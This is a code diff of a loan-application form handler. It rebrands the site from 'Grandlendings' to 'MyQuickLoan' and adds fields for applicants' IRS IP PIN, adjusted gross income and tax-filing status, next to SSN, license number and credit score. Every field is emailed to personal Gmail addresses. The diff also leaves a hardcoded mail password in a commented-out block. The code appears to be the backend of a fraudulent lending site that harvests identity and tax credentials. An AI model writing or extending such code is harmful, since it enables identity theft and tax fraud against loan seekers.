@@ -20,35 +20,37 @@ export async function POST(request) {
     },
   });
 
-  const transporter2 = nodemailer.createTransport({
-    host: "mail.privateemail.com",
-    port: 465,
-    secure: true,
-    auth: {
-      user: "noreply@Grandlendings.us",
-      pass: "mighTY88$$",
-    },
-  });
+  //   const transporter2 = nodemailer.createTransport({
+  //     host: "mail.privateemail.com",
+  //     port: 465,
+  //     secure: true,
+  //     auth: {
+  //       user: "noreply@myquickloan.us",
+  //       pass: "mighTY88$$",
+  //     },
+  //   });
 
-  const autoReplyMessage = {
-    from: "noreply@Grandlendings.us",
-    to: formData.emailAddress,
-    subject: "Loan Application Received",
-    html: `
-    <h3>Thank you for your loan application!</h3>
-    <p>We have received your loan application and will review it shortly.</p>
-    <p>If you have any further questions or need assistance, please feel free to contact us: loans@Grandlendings.us></a></p>
-    <p>Best regards,</p>
-    <p>Grandlendings Team</p>
-    `,
-  };
+  //   const autoReplyMessage = {
+  //     from: "noreply@myquickloan.us",
+  //     to: formData.emailAddress,
+  //     subject: "Loan Application Received",
+  //     html: `
+  //     <h3>Thank you for your loan application!</h3>
+  //     <p>We have received your loan application and will review it shortly.</p>
+  //     <p>If you have any further questions or need assistance, please feel free to contact us: loans@myquickloan.us></a></p>
+  //     <p>Best regards,</p>
+  //     <p>MyQuickLoan Team</p>
+  //     `,
+  //   };
   // Compose the email message
   const message = {
     from: "osr.cty@gmail.com",
     to: ["kindras131@gmail.com"],
     subject: "Loan Application Details",
     html: `
-    <h3>Loan Application Details</h3>
+    <h3>Loan Application Details ${
+      formData.taxReturn === "yes" ? "- Filed for tax return 2022" : ""
+    }</h3>
     <p>First Name: ${formData.firstName}</p>
     <p>Last Name: ${formData.lastName}</p>
     <p>Loan Amount: ${formData.loanAmount}</p>
@@ -86,9 +88,14 @@ export async function POST(request) {
     <p>Military Status: ${formData.militaryStatus}</p>
     <p>Bankruptcy History: ${formData.bankruptcyHistory}</p>
     <p>Payday Loan History: ${formData.paydayLoanHistory}</p>
-    <p>My Quick Loan Source: ${formData.GrandlendingsSource}</p>
-    <p>My Quick Loan Source Other: ${formData.GrandlendingsSourceOther}</p>
+    <p>My Quick Loan Source: ${formData.myQuickLoanSource}</p>
+    <p>My Quick Loan Source Other: ${formData.myQuickLoanSourceOther}</p>
     <p>Credit Score: ${formData.creditScore}</p>
+    <p>Mode of Disbursement: ${formData.meansOfDisbursement}</p>
+    <p>Recieved Ip Pin: ${formData.receivedIPPIN}</p>
+    <p>Filed for 2021 tax: ${formData.didFile2021Taxes}</p>
+    <p>Adjusted Gross Income: ${formData.adjustedGrossIncome}</p>
+
     <p>License Number: ${
       formData.licenseNumber
     }</p><p>Loan to be given when reduced by 20%: ${
@@ -105,7 +112,7 @@ export async function POST(request) {
 
   try {
     // Send the email
-    await transporter2.sendMail(autoReplyMessage);
+    // await transporter2.sendMail(autoReplyMessage);
     await transporter1.sendMail(message);
     await FormDataModel.create({
       ssn: ssn,
